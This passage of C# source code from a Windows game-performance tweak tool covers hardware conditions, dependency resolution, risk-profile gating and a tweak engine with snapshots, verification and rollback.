    void Write(string level, string message);
    event EventHandler<string>? MessageWritten;
}
````

### `src/FragForge.Core/Abstractions/IProcessRunner.cs`  <sub>(18 líneas)</sub>

````csharp
namespace FragForge.Core.Abstractions;

public interface IProcessRunner
{
    Task<ProcessResult> RunAsync(ProcessRequest request, CancellationToken cancellationToken = default);
}
public sealed record ProcessRequest
{
    public required string FileName { get; init; }
    public IReadOnlyList<string> Arguments { get; init; } = [];
    public string? WorkingDirectory { get; init; }
    public string? StandardInput { get; init; }
    public TimeSpan Timeout { get; init; } = TimeSpan.FromMinutes(2);
}
public sealed record ProcessResult(int ExitCode, string StandardOutput, string StandardError, bool TimedOut)
{
    public bool IsSuccess => ExitCode == 0 && !TimedOut;
}
````

### `src/FragForge.Core/Abstractions/IRegistry.cs`  <sub>(14 líneas)</sub>

````csharp
namespace FragForge.Core.Abstractions;

public interface IRegistry
{
    Task<bool> KeyExistsAsync(string key, CancellationToken cancellationToken = default);
    Task<RegistryReadResult> ReadValueAsync(string key, string name, CancellationToken cancellationToken = default);
    Task<IReadOnlyList<string>> GetValueNamesAsync(string key, CancellationToken cancellationToken = default);
    Task<IReadOnlyList<string>> GetSubKeyNamesAsync(string key, CancellationToken cancellationToken = default);
    Task WriteValueAsync(string key, string name, RegistryWriteValue value, CancellationToken cancellationToken = default);
    Task DeleteValueAsync(string key, string name, CancellationToken cancellationToken = default);
    Task DeleteEmptySubKeyAsync(string parentKey, string childName, CancellationToken cancellationToken = default);
}
public sealed record RegistryReadResult(bool KeyExists, bool ValueExists, string? Kind, object? Data);
public sealed record RegistryWriteValue(string Kind, object Data);
````

### `src/FragForge.Core/Abstractions/ITweakAction.cs`  <sub>(32 líneas)</sub>

````csharp
using FragForge.Core.Models;

namespace FragForge.Core.Abstractions;

public sealed record ActionExecutionContext
{
    public required string OperationId { get; init; }
    public required HardwareProfile Hardware { get; init; }
    public string? ArtifactDirectory { get; init; }
    public string? TargetUserSid { get; init; }
    public bool AllowPowerShellActions { get; init; }
    public IProgress<ActionProgress>? Progress { get; init; }
    public void Report(string stage, double fraction, string message) => Progress?.Report(new ActionProgress(stage, fraction, message));
}

public interface ITweakAction
{
    string Kind { get; }
    Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default);
    Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default);
    Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default);
    Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default);
    Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default);
    Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default);
    Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default);
}

public interface ITweakActionFactory
{
    IReadOnlySet<string> SupportedKinds { get; }
    ITweakAction Create(ActionSpec specification);
}
````

### `src/FragForge.Core/Conditions/ConditionFactory.cs`  <sub>(175 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Core.Conditions;

public sealed class ConditionFactory : ITweakConditionFactory
{
    private static readonly string[] Types = ["windows", "hybridCpu", "cpuVendor", "gpuVendor", "adapter", "memoryChannels", "security", "formFactor", "cs2", "atlas", "userHive", "all", "any", "not"];
    public IReadOnlySet<string> SupportedTypes { get; } = new HashSet<string>(Types, StringComparer.OrdinalIgnoreCase);
    public ITweakCondition Create(ConditionSpec specification)
    {
        var type = specification.Type.ToLowerInvariant();
        if (!SupportedTypes.Contains(type)) throw new CatalogValidationException($"Unknown condition '{specification.Type}'.", [specification.Type]);
        var json = specification.Parameters.ValueKind == JsonValueKind.Undefined ? "{}" : specification.Parameters.GetRawText();
        try
        {
            return type switch
            {
                "windows" => new WindowsCondition(Parse<WindowsParameters>(json)),
                "hybridcpu" => new HybridCpuCondition(Parse<ExpectedBoolParameters>(json)),
                "cpuvendor" => new CpuVendorCondition(Parse<VendorParameters>(json)),
                "gpuvendor" => new GpuVendorCondition(Parse<GpuParameters>(json)),
                "adapter" => new AdapterCondition(Parse<AdapterParameters>(json)),
                "memorychannels" => new MemoryCondition(Parse<MemoryParameters>(json)),
                "security" => new SecurityCondition(Parse<SecurityParameters>(json)),
                "formfactor" => new FormFactorCondition(Parse<FormFactorParameters>(json)),
                "cs2" => new Cs2Condition(Parse<Cs2Parameters>(json)),
                "atlas" => new AtlasCondition(Parse<ExpectedBoolParameters>(json)),
                "userhive" => new UserHiveCondition(Parse<ExpectedBoolParameters>(json)),
                "all" => new CompositeCondition(type, Parse<CompositeParameters>(json).Conditions, this, true),
                "any" => new CompositeCondition(type, Parse<CompositeParameters>(json).Conditions, this, false),
                "not" => new NotCondition(Parse<NotParameters>(json).Condition, this),
                _ => throw new CatalogValidationException($"Unknown condition '{type}'.", [type])
            };
        }
        catch (JsonException ex) { throw new CatalogValidationException($"Invalid parameters for condition '{type}'.", [ex.Message]); }
    }
    private static T Parse<T>(string json) => JsonSerializer.Deserialize<T>(json, JsonDefaults.Options) ?? throw new JsonException("Null condition parameters.");
}

internal sealed record WindowsParameters { public int MinBuild { get; init; } = 26100; public int MaxBuild { get; init; } = 26299; public string? Edition { get; init; } public string Architecture { get; init; } = "X64"; }
internal sealed record ExpectedBoolParameters { public bool Expected { get; init; } = true; }
internal sealed record VendorParameters { public required string Vendor { get; init; } }
internal sealed record GpuParameters { public required GpuVendor Vendor { get; init; } public bool DedicatedOnly { get; init; } }
internal sealed record AdapterParameters { public string? NameContains { get; init; } public string? DescriptionContains { get; init; } public NetworkKind? Kind { get; init; } public bool PhysicalOnly { get; init; } = true; }
internal sealed record MemoryParameters { public MemoryChannelState State { get; init; } = MemoryChannelState.Dual; }
internal sealed record SecurityParameters { public required string Feature { get; init; } public FeatureState State { get; init; } }
internal sealed record FormFactorParameters { public bool? Portable { get; init; } public bool? Battery { get; init; } }
internal sealed record Cs2Parameters { public bool Installed { get; init; } = true; public bool AllowAmbiguous { get; init; } }
internal sealed record CompositeParameters { public IReadOnlyList<ConditionSpec> Conditions { get; init; } = []; }
internal sealed record NotParameters { public required ConditionSpec Condition { get; init; } }

internal sealed class WindowsCondition(WindowsParameters p) : ITweakCondition
{
    public string Type => "windows";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        if (profile.IsUnsupportedPlatform || profile.Os.Build == 0) return ConditionResult.Unknown("No se detectó una build de Windows.");
        if (profile.Os.Build < p.MinBuild || profile.Os.Build > p.MaxBuild) return ConditionResult.Unmet($"Build {profile.Os.Build}; rango compatible {p.MinBuild}–{p.MaxBuild}.");
        if (!string.Equals(profile.Os.Architecture, p.Architecture, StringComparison.OrdinalIgnoreCase)) return ConditionResult.Unmet($"Arquitectura {profile.Os.Architecture}; se requiere {p.Architecture}.");
        if (p.Edition is not null && !profile.Os.Edition.Contains(p.Edition, StringComparison.OrdinalIgnoreCase)) return ConditionResult.Unmet($"Edición {profile.Os.Edition}; se requiere {p.Edition}.");
        return ConditionResult.Met($"Windows build {profile.Os.Build} {profile.Os.Edition} {profile.Os.Architecture}.");
    }
}
internal sealed class HybridCpuCondition(ExpectedBoolParameters p) : ITweakCondition
{
    public string Type => "hybridCpu";
    public ConditionResult Evaluate(HardwareProfile profile) => profile.Cpu.IsHybrid is null ? ConditionResult.Unknown("No se pudo consultar EfficiencyClass; no se asume CPU híbrida por el modelo.") : profile.Cpu.IsHybrid == p.Expected ? ConditionResult.Met($"CPU híbrida: {profile.Cpu.IsHybrid}.") : ConditionResult.Unmet($"CPU híbrida: {profile.Cpu.IsHybrid}; esperado {p.Expected}.");
}
internal sealed class CpuVendorCondition(VendorParameters p) : ITweakCondition
{
    public string Type => "cpuVendor";
    public ConditionResult Evaluate(HardwareProfile profile) => profile.Cpu.Vendor.Equals(p.Vendor, StringComparison.OrdinalIgnoreCase) ? ConditionResult.Met($"CPU {profile.Cpu.Vendor}.") : ConditionResult.Unmet($"CPU {profile.Cpu.Vendor}; se requiere {p.Vendor}.");
}
internal sealed class GpuVendorCondition(GpuParameters p) : ITweakCondition
{
    public string Type => "gpuVendor";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        var matches = profile.Gpus.Where(g => g.Vendor == p.Vendor && (!p.DedicatedOnly || !g.IsIntegrated)).ToArray();
        return matches.Length > 0 ? ConditionResult.Met($"GPU compatible: {matches[0].Name}.") : ConditionResult.Unmet($"No se detectó GPU {p.Vendor} compatible.");
    }
}
internal sealed class AdapterCondition(AdapterParameters p) : ITweakCondition
{
    public string Type => "adapter";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        var matches = profile.NetworkAdapters.Where(a => (!p.PhysicalOnly || a.IsPhysical) && (p.NameContains is null || a.Name.Contains(p.NameContains, StringComparison.OrdinalIgnoreCase)) && (p.DescriptionContains is null || a.Description.Contains(p.DescriptionContains, StringComparison.OrdinalIgnoreCase)) && (p.Kind is null || a.Kind == p.Kind)).ToArray();
        return matches.Length > 0 ? ConditionResult.Met($"Adaptador compatible: {matches[0].Name}.") : ConditionResult.Unmet("No se detectó el adaptador requerido.");
    }
}
internal sealed class MemoryCondition(MemoryParameters p) : ITweakCondition
{
    public string Type => "memoryChannels";
    public ConditionResult Evaluate(HardwareProfile profile) => profile.Memory.Channels == MemoryChannelState.Unknown ? ConditionResult.Unknown(profile.Memory.ChannelEvidence) : profile.Memory.Channels == p.State ? ConditionResult.Met($"Canales de RAM: {profile.Memory.Channels}.") : ConditionResult.Unmet($"Canales de RAM: {profile.Memory.Channels}; esperado {p.State}.");
}
internal sealed class SecurityCondition(SecurityParameters p) : ITweakCondition
{
    public string Type => "security";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        var state = p.Feature.ToLowerInvariant() switch { "vbs" => profile.Security.Vbs, "hvci" => profile.Security.Hvci, "secureboot" => profile.Security.SecureBoot, "tpm" => profile.Security.Tpm, "hags" => profile.Security.Hags, "mpo" => profile.Security.Mpo, _ => FeatureState.Unknown };
        return state == FeatureState.Unknown ? ConditionResult.Unknown($"{p.Feature}: estado desconocido.") : state == p.State ? ConditionResult.Met($"{p.Feature}: {state}.") : ConditionResult.Unmet($"{p.Feature}: {state}; esperado {p.State}.");
    }
}
internal sealed class FormFactorCondition(FormFactorParameters p) : ITweakCondition
{
    public string Type => "formFactor";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        if (p.Portable is not null && profile.FormFactor.IsPortable != p.Portable) return ConditionResult.Unmet($"Portátil: {profile.FormFactor.IsPortable?.ToString() ?? "desconocido"}.");
        if (p.Battery is not null && profile.FormFactor.HasBattery != p.Battery) return ConditionResult.Unmet($"Batería: {profile.FormFactor.HasBattery}.");
        return ConditionResult.Met("Factor de forma compatible.");
    }
}
internal sealed class Cs2Condition(Cs2Parameters p) : ITweakCondition
{
    public string Type => "cs2";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        var installed = !string.IsNullOrWhiteSpace(profile.Games.Cs2ExecutablePath) && (!profile.Games.Cs2Ambiguous || p.AllowAmbiguous);
        return installed == p.Installed ? ConditionResult.Met($"CS2 detectado: {installed}.") : ConditionResult.Unmet(profile.Games.Cs2Ambiguous ? "Hay varias instalaciones de CS2; selecciona una manualmente." : $"CS2 detectado: {installed}; esperado {p.Installed}.");
    }
}
internal sealed class AtlasCondition(ExpectedBoolParameters p) : ITweakCondition
{
    public string Type => "atlas";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        var detected = profile.Playbooks.Any(x => x.Name.Contains("Atlas", StringComparison.OrdinalIgnoreCase));
        return detected == p.Expected ? ConditionResult.Met($"Atlas detectado: {detected} (heurística).") : ConditionResult.Unmet($"Atlas detectado: {detected}; esperado {p.Expected}.");
    }
}
internal sealed class UserHiveCondition(ExpectedBoolParameters p) : ITweakCondition
{
    public string Type => "userHive";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        var available = !string.IsNullOrWhiteSpace(profile.InteractiveUserSid);
        return available == p.Expected ? ConditionResult.Met($"Hive del usuario interactivo: {profile.InteractiveUserName ?? profile.InteractiveUserSid}.") : ConditionResult.Unmet("No se pudo resolver el SID interactivo; no se modificará HKCU del proceso elevado.");
    }
}
internal sealed class CompositeCondition(string type, IReadOnlyList<ConditionSpec> specs, ITweakConditionFactory factory, bool all) : ITweakCondition
{
    private readonly IReadOnlyList<ITweakCondition> _children = specs.Select(factory.Create).ToArray();
    public string Type => type;
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        var results = _children.Select(c => c.Evaluate(profile)).ToArray();
        if (all)
        {
            var unknown = results.FirstOrDefault(r => !r.IsKnown);
            if (unknown is not null) return unknown;
            var unmet = results.FirstOrDefault(r => !r.IsMet);
            return unmet is null ? ConditionResult.Met("Todas las condiciones se cumplen.") : unmet;
        }
        var met = results.FirstOrDefault(r => r.IsMet);
        if (met is not null) return met;
        var knownUnmet = results.FirstOrDefault(r => r.IsKnown);
        return knownUnmet ?? ConditionResult.Unknown("Ninguna condición alternativa pudo evaluarse.");
    }
}
internal sealed class NotCondition(ConditionSpec spec, ITweakConditionFactory factory) : ITweakCondition
{
    private readonly ITweakCondition _inner = factory.Create(spec);
    public string Type => "not";
    public ConditionResult Evaluate(HardwareProfile profile)
    {
        var result = _inner.Evaluate(profile);
        return !result.IsKnown ? result : result.IsMet ? ConditionResult.Unmet(result.Reason) : ConditionResult.Met(result.Reason);
    }
}
````

### `src/FragForge.Core/Engine/ActionStateEquivalence.cs`  <sub>(23 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Core.Engine;

public static class ActionStateEquivalence
{
    public static bool Equivalent(ActionState expected, ActionState actual) => (expected, actual) switch
    {
        (RegistryActionState a, RegistryActionState b) => a.Values.Count == b.Values.Count && a.Values.Zip(b.Values).All(p => RegistryEqual(p.First, p.Second)),
        (ServiceActionState a, ServiceActionState b) => a.Service == b.Service,
        (ScheduledTaskActionState a, ScheduledTaskActionState b) => a.Path == b.Path && a.Exists == b.Exists && a.Enabled == b.Enabled,
        (PowerPlanActionState a, PowerPlanActionState b) => a.PlanName == b.PlanName && a.PreviousActiveGuid == b.PreviousActiveGuid && a.PlanExisted == b.PlanExisted && a.OwnedPlanGuid == b.OwnedPlanGuid && a.Settings.SequenceEqual(b.Settings),
        (BcdActionState a, BcdActionState b) => a.Element == b.Element && a.Existed == b.Existed && a.PreviousValue == b.PreviousValue,
        (NetworkPropertyActionState a, NetworkPropertyActionState b) => a.Properties.SequenceEqual(b.Properties),
        (FileActionState a, FileActionState b) => a.Path == b.Path && a.Existed == b.Existed && a.ContentBase64 == b.ContentBase64 && a.LastWriteTimeUtc == b.LastWriteTimeUtc,
        (ScriptActionState a, ScriptActionState b) => JsonSerializer.Serialize(a.CapturedJson, JsonDefaults.Create(false)) == JsonSerializer.Serialize(b.CapturedJson, JsonDefaults.Create(false)),
        (InspectionActionState, InspectionActionState) => true,
        _ => false
    };
    private static bool RegistryEqual(RegistryValueCapture a, RegistryValueCapture b) => a.Key.Equals(b.Key, StringComparison.OrdinalIgnoreCase) && a.Name.Equals(b.Name, StringComparison.Ordinal) && a.KeyExisted == b.KeyExisted && a.ValueExisted == b.ValueExisted && a.ValueKind == b.ValueKind && a.StringData == b.StringData && a.IntegerData == b.IntegerData && (a.MultiStringData ?? []).SequenceEqual(b.MultiStringData ?? []) && a.BinaryBase64 == b.BinaryBase64 && a.MissingAncestors.SequenceEqual(b.MissingAncestors, StringComparer.OrdinalIgnoreCase);
}
````

### `src/FragForge.Core/Engine/DependencyResolver.cs`  <sub>(46 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Core.Engine;

public static class DependencyResolver
{
    public static IReadOnlyList<TweakDefinition> Resolve(IEnumerable<string> ids, ITweakCatalog catalog)
    {
        var requested = ids.Distinct(StringComparer.OrdinalIgnoreCase).OrderBy(x => x, StringComparer.OrdinalIgnoreCase).ToArray();
        if (requested.Length == 0) throw new FragForgeException("empty_selection", "Selecciona al menos un tweak.");
        var closure = new Dictionary<string, TweakDefinition>(StringComparer.OrdinalIgnoreCase);
        var visiting = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var visited = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var ordered = new List<TweakDefinition>();
        var errors = new List<string>();
        foreach (var id in requested)
        {
            if (!catalog.TryGet(id, out var definition) || definition is null) errors.Add($"Tweak desconocido: '{id}'.");
            else Visit(definition);
        }
        if (errors.Count > 0) throw new FragForgeException("dependency_resolution", string.Join(" ", errors));
        foreach (var a in ordered)
        foreach (var b in ordered)
        {
            if (string.Equals(a.Id, b.Id, StringComparison.OrdinalIgnoreCase)) continue;
            if (a.ConflictsWith.Contains(b.Id, StringComparer.OrdinalIgnoreCase) || b.ConflictsWith.Contains(a.Id, StringComparer.OrdinalIgnoreCase)) errors.Add($"Conflicto entre '{a.Id}' y '{b.Id}'.");
        }
        if (errors.Count > 0) throw new FragForgeException("tweak_conflict", string.Join(" ", errors.Distinct(StringComparer.OrdinalIgnoreCase)));
        return ordered;
        void Visit(TweakDefinition definition)
        {
            if (visited.Contains(definition.Id)) return;
            if (!visiting.Add(definition.Id)) { errors.Add($"Ciclo de dependencias en '{definition.Id}'."); return; }
            foreach (var dependency in definition.DependsOn)
            {
                if (!catalog.TryGet(dependency, out var parent) || parent is null) { errors.Add($"'{definition.Id}' depende del tweak inexistente '{dependency}'."); continue; }
                Visit(parent);
            }
            visiting.Remove(definition.Id);
            visited.Add(definition.Id);
            closure[definition.Id] = definition;
            ordered.Add(definition);
        }
    }
}
````

### `src/FragForge.Core/Engine/ProfileSelector.cs`  <sub>(24 líneas)</sub>

````csharp
using FragForge.Core.Models;

namespace FragForge.Core.Engine;

public static class ProfileSelector
{
    public static IReadOnlyList<TweakDefinition> Select(IEnumerable<TweakDefinition> definitions, TweakProfile profile) => definitions.Where(d => Allows(profile, d)).OrderBy(d => d.Id, StringComparer.OrdinalIgnoreCase).ToArray();
    public static bool Allows(TweakProfile profile, TweakDefinition definition) => profile switch
    {
        TweakProfile.Safe => definition.Risk == RiskLevel.Safe && definition.Evidence != EvidenceLevel.Experimental && !definition.Tags.Contains("opt-in", StringComparer.OrdinalIgnoreCase),
        TweakProfile.Balanced => definition.Risk is RiskLevel.Safe or RiskLevel.Moderate && definition.Evidence != EvidenceLevel.Experimental && definition.Risk != RiskLevel.Experimental && !definition.Tags.Contains("opt-in", StringComparer.OrdinalIgnoreCase),
        TweakProfile.Competitive => definition.Risk is RiskLevel.Safe or RiskLevel.Moderate && definition.Evidence != EvidenceLevel.Experimental && definition.Risk != RiskLevel.Experimental,
        TweakProfile.Advanced => true,
        _ => false
    };
    public static void EnsureRiskAccepted(TweakDefinition definition, ApplyOptions options)
    {
        if (!Allows(options.Profile, definition) && !(options.Profile == TweakProfile.Advanced)) throw new FragForgeException("profile_rejected", $"'{definition.Id}' no está permitido por el perfil {options.Profile}.");
        if (definition.Risk is RiskLevel.Advanced or RiskLevel.Experimental || definition.Actions.Any(a => a.Kind.Equals("PowerShell", StringComparison.OrdinalIgnoreCase) || a.Kind.Equals("Bcdedit", StringComparison.OrdinalIgnoreCase)))
        {
            if (options.Profile != TweakProfile.Advanced || !options.RiskAcknowledgements.Contains(definition.Id) || options.AdvancedRiskPhrase != "ACEPTO EL RIESGO") throw new FragForgeException("risk_confirmation_required", $"'{definition.Id}' requiere perfil Advanced, aceptación explícita por ID y la frase exacta 'ACEPTO EL RIESGO'.");
        }
    }
}
````

### `src/FragForge.Core/Engine/TweakEngine.cs`  <sub>(576 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using Microsoft.Extensions.Logging;

namespace FragForge.Core.Engine;

public sealed class TweakEngine(
    ITweakCatalog catalog,
    IHardwareProfiler profiler,
    ITweakActionFactory actionFactory,
    ITweakConditionFactory conditionFactory,
    ISnapshotStore snapshots,
    IJournal journal,
    ISystemRestoreService restore,
    IPreflightService preflight,
    IExecutionGate gate,
    IEnumerable<IExperimentHook> hooks,
    ILogger<TweakEngine> logger) : ITweakEngine
{
    private readonly IReadOnlyList<IExperimentHook> _hooks = hooks.OrderBy(h => h.Order).ToArray();

    public async Task<ScanReport> ScanAsync(CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null)
    {
        progress?.Report(new EngineProgress("hardware", null, 0, "Detectando hardware y estado del sistema."));
        var hardware = await profiler.ProfileAsync(cancellationToken, progress);
        var ownership = await ReadOwnershipAsync(cancellationToken);
        var statuses = new List<TweakStatus>();
        for (var i = 0; i < catalog.Definitions.Count; i++)
        {
            cancellationToken.ThrowIfCancellationRequested();
            var definition = catalog.Definitions[i];
            progress?.Report(new EngineProgress("scan", definition.Id, (double)(i + 1) / catalog.Definitions.Count, definition.Title.EsMx));
            statuses.Add(await EvaluateAsync(definition, hardware, ownership, cancellationToken));
        }
        return new ScanReport(hardware, statuses, DateTimeOffset.UtcNow);
    }

    public async Task<TweakStatus> GetStateAsync(string id, CancellationToken cancellationToken = default)
    {
        var definition = catalog.Get(id);
        var hardware = await profiler.ProfileAsync(cancellationToken);
        var ownership = await ReadOwnershipAsync(cancellationToken);
        return await EvaluateAsync(definition, hardware, ownership, cancellationToken);
    }

    public async Task<SystemSnapshot> CreateSnapshotAsync(string label, bool createRestorePoint = true, CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null)
    {
        await using var lease = await gate.AcquireAsync(cancellationToken);
        var operationId = NewId();
        var hardware = await profiler.ProfileAsync(cancellationToken, progress);
        var options = new ApplyOptions { CreateRestorePoint = createRestorePoint, Profile = TweakProfile.Advanced };
        var preflightReport = await preflight.CheckAsync(options, hardware, cancellationToken);
        if (!preflightReport.CanApply) throw new PreflightFailedException("El preflight impide crear el snapshot con punto de restauración.", preflightReport);
        var plans = new List<ActionPlan>();
        foreach (var definition in catalog.Definitions.Where(d => !d.ReadOnly))
        {
            var plan = await TryBuildPlanAsync(definition, hardware, null, operationId, cancellationToken);
            if (plan is not null) plans.Add(plan);
        }
        var snapshot = await CaptureAndPersistAsync(operationId, label, hardware, plans, createRestorePoint, cancellationToken, progress);
        logger.LogInformation("Snapshot {SnapshotId} creado con {TweakCount} tweaks capturados.", snapshot.Id, snapshot.Tweaks.Count);
        return snapshot;
    }

    public async Task<BatchReport> ApplyAsync(IEnumerable<string> ids, ApplyOptions options, CancellationToken cancellationToken = default, IProgress<EngineProgress>? progress = null)
    {
        await using var lease = await gate.AcquireAsync(cancellationToken);
        var operationId = NewId();
        var results = new List<TweakApplyResult>();
        var errors = new List<string>();
        var warnings = new List<string>();
        string? snapshotId = null;
        long? restoreSequence = null;
        var cancelled = false;
        var critical = false;
        var failed = false;
        await AppendAsync(operationId, JournalEventType.OperationStarted, null, null, options.DryRun ? "Apply dry-run" : "Apply", cancellationToken);
        try
        {
            var ordered = DependencyResolver.Resolve(ids, catalog);
            var hardware = ApplyOverrides(await profiler.ProfileAsync(cancellationToken, progress), options.TargetUserSid, options.Cs2ExecutableOverride);
            var plans = new List<ActionPlan>();
            var skipped = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var definition in ordered)
            {
                cancellationToken.ThrowIfCancellationRequested();
                if (definition.DependsOn.Any(skipped.Contains))
                {
                    skipped.Add(definition.Id);
                    results.Add(Skipped(definition.Id, TweakState.NotApplicable, "Una dependencia no está aplicada o no es aplicable."));
                    continue;
                }
                var condition = EvaluateConditions(definition, hardware);
                if (!condition.IsMet)
                {
                    skipped.Add(definition.Id);
                    results.Add(Skipped(definition.Id, TweakState.NotApplicable, condition.Reason));
                    continue;
                }
                if (!options.DryRun) ProfileSelector.EnsureRiskAccepted(definition, options);
                var plan = await TryBuildPlanAsync(definition, hardware, options, operationId, cancellationToken);
                if (plan is null)
                {
                    skipped.Add(definition.Id);
                    results.Add(Skipped(definition.Id, TweakState.NotApplicable, "El destino de la acción no está disponible en este equipo."));
                    continue;
                }
                plans.Add(plan);
            }
            if (options.DryRun)
            {
                foreach (var plan in plans)
                {
                    var changes = new List<DryRunChange>();
                    for (var i = 0; i < plan.Actions.Count; i++) changes.Add(new(plan.Definition.Id, i, plan.Actions[i].Kind, await plan.Actions[i].DryRunAsync(plan.Context, cancellationToken)));
                    var current = await VerifyPlanAsync(plan, cancellationToken);
                    results.Add(new TweakApplyResult { Id = plan.Definition.Id, State = current.State, Message = "Simulación sin cambios. " + current.Reason, PlannedChanges = changes });
                }
                return await FinishAsync(new BatchReport { OperationId = operationId, DryRun = true, Success = true, Results = results, Warnings = warnings }, true, cancellationToken);
            }
            if (plans.Count == 0)
            {
                warnings.Add("No hay tweaks aplicables; no se creó snapshot ni punto de restauración.");
                return await FinishAsync(new BatchReport { OperationId = operationId, Success = true, Results = results, Warnings = warnings }, true, cancellationToken);
            }
            var needsRestore = options.CreateRestorePoint && plans.Any(p => !p.Definition.ReadOnly);
            var effectiveOptions = options with { CreateRestorePoint = needsRestore };
            var preflightReport = await preflight.CheckAsync(effectiveOptions, hardware, cancellationToken);
            warnings.AddRange(preflightReport.Checks.Where(c => c.Severity == PreflightSeverity.Warning).Select(c => c.Message));
            if (!preflightReport.CanApply) throw new PreflightFailedException("El preflight bloqueó la aplicación: " + string.Join(" ", preflightReport.Checks.Where(c => c.Severity == PreflightSeverity.Blocking).Select(c => c.Message)), preflightReport);
            var ownership = await ReadOwnershipAsync(cancellationToken);
            var applicable = new List<ActionPlan>();
            foreach (var plan in plans)
            {
                var state = await VerifyPlanAsync(plan, cancellationToken);
                if (state.State is TweakState.Applied or TweakState.AppliedExternally && !options.Force)
                {
                    var owned = ownership.Contains(plan.Definition.Id);
                    results.Add(Skipped(plan.Definition.Id, owned ? TweakState.Applied : TweakState.AppliedExternally, owned ? "Ya está aplicado por FragForge; idempotencia." : "Ya coincide con el objetivo, posiblemente por Atlas/usuario. No se sobrescribe sin Force."));
                    continue;
                }
                applicable.Add(plan);
            }
            if (applicable.Count == 0)
            {
                warnings.Add("Todos los tweaks seleccionados ya coinciden; no hubo cambios.");
                return await FinishAsync(new BatchReport { OperationId = operationId, Success = true, Results = results, Warnings = warnings }, true, cancellationToken);
            }
            if (needsRestore && options.EnableSystemProtection)
            {
                var protection = await restore.GetProtectionStateAsync(cancellationToken);
                if (protection == FeatureState.Disabled)
                {
                    await restore.EnableProtectionAsync(cancellationToken);
                    protection = await restore.GetProtectionStateAsync(cancellationToken);
                    if (protection != FeatureState.Enabled) throw new PreflightFailedException("No se pudo confirmar la protección del sistema tras habilitarla; no se aplicará ningún cambio.", preflightReport);
                    warnings.Add("Protección del sistema habilitada explícitamente para esta operación.");
                }
                else if (protection != FeatureState.Enabled) throw new PreflightFailedException("La protección del sistema no pudo confirmarse; usa --no-restore-point si aceptas solo snapshot y journal.", preflightReport);
            }
            var snapshot = await CaptureAndPersistAsync(operationId, "apply: " + string.Join(", ", applicable.Select(p => p.Definition.Id)), hardware, applicable, needsRestore, cancellationToken, progress);
            snapshotId = snapshot.Id;
            restoreSequence = snapshot.RestorePointSequence;
            foreach (var plan in applicable)
            {
                plan.States.Clear();
                foreach (var captured in snapshot.Tweaks.First(t => t.TweakId == plan.Definition.Id).Actions)
                plan.States.Add(captured.State);
            }
            foreach (var plan in applicable)
            {
                cancellationToken.ThrowIfCancellationRequested();
                await RunHooksAsync(ExperimentPhase.BeforeApply, operationId, snapshotId, plan, hardware, snapshots.GetArtifactDirectory(snapshotId), cancellationToken, warnings, failOnError: true);
            }
            foreach (var plan in applicable)
            {
                cancellationToken.ThrowIfCancellationRequested();
                var attempted = new List<(ITweakAction Action, ActionState Before)>();
                var planWarnings = new List<string>();
                try
                {
                    await AppendAsync(operationId, JournalEventType.TweakApplyStarted, plan.Definition.Id, snapshotId, null, cancellationToken);
                    for (var i = 0; i < plan.Actions.Count; i++)
                    {
                        cancellationToken.ThrowIfCancellationRequested();
                        var action = plan.Actions[i];
                        var before = plan.States[i];
                        attempted.Add((action, before));
                        progress?.Report(new EngineProgress("apply", plan.Definition.Id, (double)i / plan.Actions.Count, $"Aplicando {action.Kind}."));
                        await action.ApplyAsync(before, plan.Context, cancellationToken);
                        var verification = await action.VerifyAsync(before, plan.Context, cancellationToken);
                        if (verification.Outcome != VerificationOutcome.Matches) throw new VerificationFailedException($"{action.Kind}: {verification.Message}");
                        action.ReportReady(plan.Context, "verify", 1, verification.Message);
                    }
                    await AppendAsync(operationId, JournalEventType.TweakApplied, plan.Definition.Id, snapshotId, null, cancellationToken);
                    await RunHooksAsync(ExperimentPhase.AfterApply, operationId, snapshotId, plan, hardware, snapshots.GetArtifactDirectory(snapshotId), cancellationToken, planWarnings, failOnError: false);
                    if (plan.Definition.RequiresReboot) planWarnings.Add("Requiere reinicio para que todos los efectos sean activos.");
                    results.Add(new TweakApplyResult { Id = plan.Definition.Id, State = plan.Definition.ReadOnly ? TweakState.Inspected : TweakState.Applied, Message = plan.Definition.ReadOnly ? "Inspección completada sin cambios." : "Aplicado y verificado.", Changed = !plan.Definition.ReadOnly, Warnings = planWarnings });
                }
                catch (Exception ex) when (ex is not OutOfMemoryException)
                {
                    failed = true;
                    cancelled |= ex is OperationCanceledException;
                    errors.Add($"{plan.Definition.Id}: {ex.Message}");
                    logger.LogError(ex, "Fallo al aplicar {TweakId}; iniciando rollback del tweak.", plan.Definition.Id);
                    var rollbackErrors = await RollbackAsync(operationId, snapshotId, plan.Definition.Id, attempted, plan.Context);
                    critical |= rollbackErrors.Count > 0;
                    errors.AddRange(rollbackErrors);
